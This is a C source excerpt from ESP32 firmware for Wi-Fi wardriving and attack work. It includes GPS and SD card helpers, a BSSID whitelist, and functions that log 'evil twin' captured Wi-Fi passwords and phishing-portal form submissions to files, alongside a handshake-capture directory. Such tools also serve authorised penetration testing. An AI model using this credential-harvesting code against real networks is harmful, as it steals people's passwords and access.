// === WARDRIVE HELPER FUNCTIONS ===

static esp_err_t init_gps_uart(void) {
    uart_config_t uart_config = {
        .baud_rate = 9600,
        .data_bits = UART_DATA_8_BITS,
        .parity = UART_PARITY_DISABLE,
        .stop_bits = UART_STOP_BITS_1,
        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE,
        .source_clk = UART_SCLK_DEFAULT,
    };

    esp_err_t err;

    if (!gps_uart_initialized) {
        err = uart_driver_install(GPS_UART_NUM, GPS_BUF_SIZE * 2, 0, 0, NULL, 0);
        if (err == ESP_ERR_INVALID_STATE) {
            // Driver already installed from a previous run
            gps_uart_initialized = true;
        } else if (err != ESP_OK) {
            return err;
        } else {
            gps_uart_initialized = true;
        }
    }

    err = uart_param_config(GPS_UART_NUM, &uart_config);
    if (err != ESP_OK) {
        return err;
    }

    err = uart_set_pin(GPS_UART_NUM, GPS_TX_PIN, GPS_RX_PIN, UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE);
    if (err != ESP_OK) {
        return err;
    }

    return ESP_OK;
}

static esp_err_t init_sd_card(void) {
    esp_err_t ret;
    
    // Check if SD card is already mounted
    if (sd_card_mounted) {
        return ESP_OK;
    }
    
    // Options for mounting the filesystem (optimized for low memory)
    esp_vfs_fat_sdmmc_mount_config_t mount_config = {
        .format_if_mount_failed = false,  // Don't format automatically to save memory
        .max_files = 5,                   // Increased to 5 for password logging
        .allocation_unit_size = 0,        // Use default (512 bytes) to save memory
        .disk_status_check_enable = false
    };
    
    sdmmc_card_t *card;
    const char mount_point[] = "/sdcard";
    
    // Configure SPI bus (balanced for SD card requirements and memory)
    spi_bus_config_t bus_cfg = {
        .mosi_io_num = SD_MOSI_PIN,
        .miso_io_num = SD_MISO_PIN,
        .sclk_io_num = SD_CLK_PIN,
        .quadwp_io_num = -1,
        .quadhd_io_num = -1,
        .max_transfer_sz = 4096,  // SD card needs at least 4KB for sector operations
    };
    
    ret = spi_bus_initialize(SPI2_HOST, &bus_cfg, SPI_DMA_CH_AUTO);  // DMA required for SD card
    if (ret != ESP_OK && ret != ESP_ERR_INVALID_STATE) {
        MY_LOG_INFO(TAG, "Failed to initialize SPI bus: %s", esp_err_to_name(ret));
        return ret;
    }
    
    // Initialize the SD card host
    sdmmc_host_t host = SDSPI_HOST_DEFAULT();
    host.slot = SPI2_HOST;
    
    sdspi_device_config_t slot_config = SDSPI_DEVICE_CONFIG_DEFAULT();
    slot_config.gpio_cs = SD_CS_PIN;
    slot_config.host_id = host.slot;
    
    ret = esp_vfs_fat_sdspi_mount(mount_point, &host, &slot_config, &mount_config, &card);
    
    if (ret != ESP_OK) {
        if (ret == ESP_FAIL) {
            MY_LOG_INFO(TAG, "Failed to mount filesystem. If you want the card to be formatted, set format_if_mount_failed = true.");
        } else {
            MY_LOG_INFO(TAG, "Failed to initialize the card (%s). Make sure SD card lines have pull-up resistors in place.", esp_err_to_name(ret));
        }
        return ret;
    }
    
    // Print card info
    MY_LOG_INFO(TAG, "SD card mounted successfully");
    sdmmc_card_print_info(stdout, card);
    
    // Test file creation to verify write access
    FILE *test_file = fopen("/sdcard/test.txt", "w");
    if (test_file != NULL) {
        fprintf(test_file, "Test write\n");
        fclose(test_file);
        MY_LOG_INFO(TAG, "SD card write test successful");
        // Clean up test file
        unlink("/sdcard/test.txt");
    } else {
        MY_LOG_INFO(TAG, "SD card write test failed, errno: %d (%s)", errno, strerror(errno));
    }
    
    // Mark SD card as successfully mounted
    sd_card_mounted = true;
    
    return ESP_OK;
}

// Create necessary directories on SD card
static esp_err_t create_sd_directories(void) {
    struct stat st;
    
    MY_LOG_INFO(TAG, "Checking and creating SD card directories...");
    
    // Create /sdcard/lab directory
    if (stat("/sdcard/lab", &st) != 0) {
        MY_LOG_INFO(TAG, "Creating /sdcard/lab directory...");
        if (mkdir("/sdcard/lab", 0755) != 0) {
            MY_LOG_INFO(TAG, "Failed to create /sdcard/lab directory: %s", strerror(errno));
            return ESP_FAIL;
        }
        MY_LOG_INFO(TAG, "/sdcard/lab created successfully");
    } else {
        MY_LOG_INFO(TAG, "/sdcard/lab already exists");
    }
    
    // Create /sdcard/lab/htmls directory
    if (stat("/sdcard/lab/htmls", &st) != 0) {
        MY_LOG_INFO(TAG, "Creating /sdcard/lab/htmls directory...");
        if (mkdir("/sdcard/lab/htmls", 0755) != 0) {
            MY_LOG_INFO(TAG, "Failed to create /sdcard/lab/htmls directory: %s", strerror(errno));
            return ESP_FAIL;
        }
        MY_LOG_INFO(TAG, "/sdcard/lab/htmls created successfully");
    } else {
        MY_LOG_INFO(TAG, "/sdcard/lab/htmls already exists");
    }
    
    // Create /sdcard/lab/handshakes directory
    if (stat("/sdcard/lab/handshakes", &st) != 0) {
        MY_LOG_INFO(TAG, "Creating /sdcard/lab/handshakes directory...");
        if (mkdir("/sdcard/lab/handshakes", 0755) != 0) {
            MY_LOG_INFO(TAG, "Failed to create /sdcard/lab/handshakes directory: %s", strerror(errno));
            return ESP_FAIL;
        }
        MY_LOG_INFO(TAG, "/sdcard/lab/handshakes created successfully");
    } else {
        MY_LOG_INFO(TAG, "/sdcard/lab/handshakes already exists");
    }
    
    // Create /sdcard/lab/wardrives directory
    if (stat("/sdcard/lab/wardrives", &st) != 0) {
        MY_LOG_INFO(TAG, "Creating /sdcard/lab/wardrives directory...");
        if (mkdir("/sdcard/lab/wardrives", 0755) != 0) {
            MY_LOG_INFO(TAG, "Failed to create /sdcard/lab/wardrives directory: %s", strerror(errno));
            return ESP_FAIL;
        }
        MY_LOG_INFO(TAG, "/sdcard/lab/wardrives created successfully");
    } else {
        MY_LOG_INFO(TAG, "/sdcard/lab/wardrives already exists");
    }
    
    MY_LOG_INFO(TAG, "All required directories are ready");
    return ESP_OK;
}

static bool parse_gps_nmea(const char* nmea_sentence) {
    if (!nmea_sentence || strlen(nmea_sentence) < 10) {
        return false;
    }
    
    // Parse GPGGA sentence for basic GPS data
    if (strncmp(nmea_sentence, "$GPGGA", 6) == 0 || strncmp(nmea_sentence, "$GNGGA", 6) == 0) {
        char sentence[256];
        strncpy(sentence, nmea_sentence, sizeof(sentence) - 1);
        sentence[sizeof(sentence) - 1] = '\0';
        
        char *token = strtok(sentence, ",");
        int field = 0;
        float lat_deg = 0, lat_min = 0;
        float lon_deg = 0, lon_min = 0;
        char lat_dir = 'N', lon_dir = 'E';
        int quality = 0;
        float altitude = 0;
        float hdop = 1.0;
        
        while (token != NULL) {
            switch (field) {
                case 2: // Latitude DDMM.MMMM
                    if (strlen(token) > 4) {
                        lat_deg = (token[0] - '0') * 10 + (token[1] - '0');
                        lat_min = atof(token + 2);
                    }
                    break;
                case 3: // Latitude direction
                    lat_dir = token[0];
                    break;
                case 4: // Longitude DDDMM.MMMM
                    if (strlen(token) > 5) {
                        lon_deg = (token[0] - '0') * 100 + (token[1] - '0') * 10 + (token[2] - '0');
                        lon_min = atof(token + 3);
                    }
                    break;
                case 5: // Longitude direction
                    lon_dir = token[0];
                    break;
                case 6: // GPS quality
                    quality = atoi(token);
                    break;
                case 8: // HDOP
                    hdop = atof(token);
                    break;
                case 9: // Altitude
                    altitude = atof(token);
                    break;
            }
            token = strtok(NULL, ",");
            field++;
        }
        
        if (quality > 0) {
            // Convert to decimal degrees
            current_gps.latitude = lat_deg + lat_min / 60.0;
            if (lat_dir == 'S') current_gps.latitude = -current_gps.latitude;
            
            current_gps.longitude = lon_deg + lon_min / 60.0;
            if (lon_dir == 'W') current_gps.longitude = -current_gps.longitude;
            
            current_gps.altitude = altitude;
            current_gps.accuracy = hdop * 4.0; // Rough accuracy estimate
            current_gps.valid = true;
            
            return true;
        }
    }
    
    return false;
}

static void get_timestamp_string(char* buffer, size_t size) {
    // For now, use a simple counter-based timestamp
    // In a real implementation, you'd use RTC or NTP time
    static uint32_t timestamp_counter = 0;
    timestamp_counter++;
    
    // Format as a simple date-time string
    snprintf(buffer, size, "2025-09-26 %02d:%02d:%02d", 
             (int)((timestamp_counter / 3600) % 24),
             (int)((timestamp_counter / 60) % 60), 
             (int)(timestamp_counter % 60));
}

static const char* get_auth_mode_wiggle(wifi_auth_mode_t mode) {
    switch(mode) {
        case WIFI_AUTH_OPEN:
            return "Open";
        case WIFI_AUTH_WEP:
            return "WEP";
        case WIFI_AUTH_WPA_PSK:
            return "WPA_PSK";
        case WIFI_AUTH_WPA2_PSK:
            return "WPA2_PSK";
        case WIFI_AUTH_WPA_WPA2_PSK:
            return "WPA_WPA2_PSK";
        case WIFI_AUTH_WPA2_ENTERPRISE:
            return "WPA2_ENTERPRISE";
        case WIFI_AUTH_WPA3_PSK:
            return "WPA3_PSK";
        case WIFI_AUTH_WPA2_WPA3_PSK:
            return "WPA2_WPA3_PSK";
        case WIFI_AUTH_WAPI_PSK:
            return "WAPI_PSK";
        default:
            return "Unknown";
    }
}

static bool wait_for_gps_fix(int timeout_seconds) {
    int elapsed = 0;
    current_gps.valid = false;
    
    MY_LOG_INFO(TAG, "Waiting for GPS fix (timeout: %d seconds)...", timeout_seconds);
    
    while (elapsed < timeout_seconds) {
        // Check for stop request
        if (operation_stop_requested) {
            MY_LOG_INFO(TAG, "GPS wait: Stop requested, terminating...");
            return false;
        }
        
        // Read GPS data
        int len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(1000));
        if (len > 0) {
            wardrive_gps_buffer[len] = '\0';
            char* line = strtok(wardrive_gps_buffer, "\r\n");
            while (line != NULL) {
                if (parse_gps_nmea(line)) {
                    if (current_gps.valid) {
                        return true;  // GPS fix obtained
                    }
                }
                line = strtok(NULL, "\r\n");
            }
        }
        
        elapsed++;
        if (elapsed % 10 == 0) {  // Print status every 10 seconds
            MY_LOG_INFO(TAG, "Still waiting for GPS fix... (%d/%d seconds)", elapsed, timeout_seconds);
        }
    }
    
    return false;  // Timeout reached without GPS fix
}

static int find_next_wardrive_file_number(void) {
    int max_number = 0;
    char filename[64];
    MY_LOG_INFO(TAG, "Scanning for existing wardrive log files...");
    // Scan through possible file numbers to find the highest existing one
    for (int i = 1; i <= 9999; i++) {
        snprintf(filename, sizeof(filename), "/sdcard/lab/wardrives/w%d.log", i);
        
        struct stat file_stat;
        if (stat(filename, &file_stat) == 0) {
            // File exists, update max_number
            max_number = i;
            MY_LOG_INFO(TAG, "Found existing file: w%d.log", i);
        } else {
            // First non-existing file number, we can break here for efficiency
            break;
        }
    }
    
    int next_number = max_number + 1;
    MY_LOG_INFO(TAG, "Highest existing file number: %d, next will be: %d", max_number, next_number);
    
    return next_number;
}

// Save evil twin password to SD card
static void save_evil_twin_password(const char* ssid, const char* password) {
    // Initialize SD card if not already mounted
    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card for password logging: %s", esp_err_to_name(ret));
        return;
    }
    
    // Check if /sdcard directory is accessible
    struct stat st;
    if (stat("/sdcard", &st) != 0) {
        MY_LOG_INFO(TAG, "Error: /sdcard directory not accessible");
        return;
    }
    
    // Try to open file for appending (use short name without underscore for FAT compatibility)
    FILE *file = fopen("/sdcard/lab/eviltwin.txt", "a");
    if (file == NULL) {
        MY_LOG_INFO(TAG, "Failed to open eviltwin.txt for append, errno: %d (%s). Trying to create...", errno, strerror(errno));
        
        // Try to create the file first
        file = fopen("/sdcard/lab/eviltwin.txt", "w");
        if (file == NULL) {
            MY_LOG_INFO(TAG, "Failed to create eviltwin.txt, errno: %d (%s)", errno, strerror(errno));
            return;
        }
        // Close and reopen in append mode
        fclose(file);
        file = fopen("/sdcard/lab/eviltwin.txt", "a");
        if (file == NULL) {
            MY_LOG_INFO(TAG, "Failed to reopen eviltwin.txt, errno: %d (%s)", errno, strerror(errno));
            return;
        }
        MY_LOG_INFO(TAG, "Successfully created eviltwin.txt");
    }
    
    // Write SSID and password in CSV format
    fprintf(file, "\"%s\", \"%s\"\n", ssid, password);
    
    // Flush and close file to ensure data is written to disk
    fflush(file);
    fclose(file);
    
    MY_LOG_INFO(TAG, "Password saved to eviltwin.txt");
}

// Save portal form data to SD card
static void save_portal_data(const char* ssid, const char* form_data) {
    // Initialize SD card if not already mounted
    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card for portal data logging: %s", esp_err_to_name(ret));
        return;
    }
    
    // Check if /sdcard directory is accessible
    struct stat st;
    if (stat("/sdcard", &st) != 0) {
        MY_LOG_INFO(TAG, "Error: /sdcard directory not accessible");
        return;
    }
    
    // Try to open file for appending
    FILE *file = fopen("/sdcard/lab/portals.txt", "a");
    if (file == NULL) {
        MY_LOG_INFO(TAG, "Failed to open portals.txt for append, errno: %d (%s). Trying to create...", errno, strerror(errno));
        
        // Try to create the file first
        file = fopen("/sdcard/lab/portals.txt", "w");
        if (file == NULL) {
            MY_LOG_INFO(TAG, "Failed to create portals.txt, errno: %d (%s)", errno, strerror(errno));
            return;
        }
        // Close and reopen in append mode
        fclose(file);
        file = fopen("/sdcard/lab/portals.txt", "a");
        if (file == NULL) {
            MY_LOG_INFO(TAG, "Failed to reopen portals.txt, errno: %d (%s)", errno, strerror(errno));
            return;
        }
        MY_LOG_INFO(TAG, "Successfully created portals.txt");
    }
    
    // Write SSID as first field
    fprintf(file, "\"%s\", ", ssid ? ssid : "Unknown");
    
    // Parse form data and extract all fields
    // Form data is in format: field1=value1&field2=value2&...
    char *data_copy = strdup(form_data);
    if (data_copy == NULL) {
        fclose(file);
        return;
    }
    
    // Count fields first to properly format CSV
    int field_count = 0;
    char *temp_copy = strdup(form_data);
    if (temp_copy == NULL) {
        MY_LOG_INFO(TAG, "Memory allocation failed for temp_copy");
        free(data_copy);
        fclose(file);
        return;
    }
    
    char *token = strtok(temp_copy, "&");
    while (token != NULL) {
        field_count++;
        token = strtok(NULL, "&");
    }
    free(temp_copy);
    
    // Now process each field
    int current_field = 0;
    token = strtok(data_copy, "&");
    while (token != NULL) {
        char *equals = strchr(token, '=');
        if (equals != NULL) {
            *equals = '\0';
            char *key = token;
            char *value = equals + 1;

            // URL decode the key
            char decoded_key[128];
            int decoded_key_len = 0;
            for (char *p = key; *p && decoded_key_len < sizeof(decoded_key) - 1; p++) {
                if (*p == '%' && p[1] && p[2]) {
                    char hex[3] = {p[1], p[2], '\0'};
                    decoded_key[decoded_key_len++] = (char)strtol(hex, NULL, 16);
                    p += 2;
                } else if (*p == '+') {
                    decoded_key[decoded_key_len++] = ' ';
                } else {
                    decoded_key[decoded_key_len++] = *p;
                }
            }
            decoded_key[decoded_key_len] = '\0';

            // URL decode the value
            char decoded_value[128];
            int decoded_len = 0;
            for (char *p = value; *p && decoded_len < sizeof(decoded_value) - 1; p++) {
                if (*p == '%' && p[1] && p[2]) {
                    char hex[3] = {p[1], p[2], '\0'};
                    decoded_value[decoded_len++] = (char)strtol(hex, NULL, 16);
                    p += 2;
                } else if (*p == '+') {
                    decoded_value[decoded_len++] = ' ';
                } else {
                    decoded_value[decoded_len++] = *p;
                }
            }
            decoded_value[decoded_len] = '\0';

            // Write field name and value in CSV format as key=value
            fprintf(file, "\"%s=%s\"", decoded_key, decoded_value);

            // Add comma if not last field
            current_field++;
            if (current_field < field_count) {
                fprintf(file, ", ");
            }
        }
        token = strtok(NULL, "&");
    }
    
    // End line
    fprintf(file, "\n");
    
    // Flush and close file to ensure data is written to disk
    fflush(file);
    fclose(file);
    
    free(data_copy);
    
    MY_LOG_INFO(TAG, "Portal data saved to portals.txt");
}

// Load whitelist from SD card
static void load_whitelist_from_sd(void) {
    whitelistedBssidsCount = 0; // Reset count
    
    MY_LOG_INFO(TAG, "Checking for whitelist file (white.txt) on SD card...");
    
    // Try to initialize SD card (silently fail if not available)
    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "SD card not available - whitelist will be empty");
        return;
    }
    
    // Try to open white.txt file
    FILE *file = fopen("/sdcard/lab/white.txt", "r");
    if (file == NULL) {
        MY_LOG_INFO(TAG, "white.txt not found on SD card - whitelist will be empty");
        return;
    }
    
    MY_LOG_INFO(TAG, "Found white.txt, loading whitelisted BSSIDs...");
    
    char line[128];
    int line_number = 0;
    int loaded_count = 0;
    
    while (fgets(line, sizeof(line), file) != NULL && whitelistedBssidsCount < MAX_WHITELISTED_BSSIDS) {
        line_number++;
        
        // Remove trailing newline/whitespace
        line[strcspn(line, "\r\n")] = '\0';
        
        // Skip empty lines
        if (strlen(line) == 0) {
            continue;
        }
        
        // Parse BSSID in format: XX:XX:XX:XX:XX:XX or XX-XX-XX-XX-XX-XX
        uint8_t bssid[6];
        int matches = 0;
        
        // Try with colon separator
        matches = sscanf(line, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                        &bssid[0], &bssid[1], &bssid[2],
                        &bssid[3], &bssid[4], &bssid[5]);
        
        // If that didn't work, try with dash separator
        if (matches != 6) {
            matches = sscanf(line, "%hhx-%hhx-%hhx-%hhx-%hhx-%hhx",
                            &bssid[0], &bssid[1], &bssid[2],
                            &bssid[3], &bssid[4], &bssid[5]);
        }
        
        if (matches == 6) {
            // Valid BSSID found, add to whitelist
            memcpy(whiteListedBssids[whitelistedBssidsCount].bssid, bssid, 6);
            whitelistedBssidsCount++;
            loaded_count++;
            
            MY_LOG_INFO(TAG, "  [%d] Loaded: %02X:%02X:%02X:%02X:%02X:%02X",
                       loaded_count,
                       bssid[0], bssid[1], bssid[2],
                       bssid[3], bssid[4], bssid[5]);
        } else {
            MY_LOG_INFO(TAG, "  Line %d: Invalid BSSID format, ignoring: %s", line_number, line);
        }
    }
    
    fclose(file);
    
    if (whitelistedBssidsCount > 0) {
        MY_LOG_INFO(TAG, "Successfully loaded %d whitelisted BSSID(s)", whitelistedBssidsCount);
    } else {
        MY_LOG_INFO(TAG, "No valid BSSIDs found in white.txt");
    }
}

// Check if a BSSID is in the whitelist
static bool is_bssid_whitelisted(const uint8_t *bssid) {
    if (bssid == NULL || whitelistedBssidsCount == 0) {
        return false;
    }
    
    for (int i = 0; i < whitelistedBssidsCount; i++) {
        if (memcmp(bssid, whiteListedBssids[i].bssid, 6) == 0) {
            return true;
        }
    }
    
    return false;
}


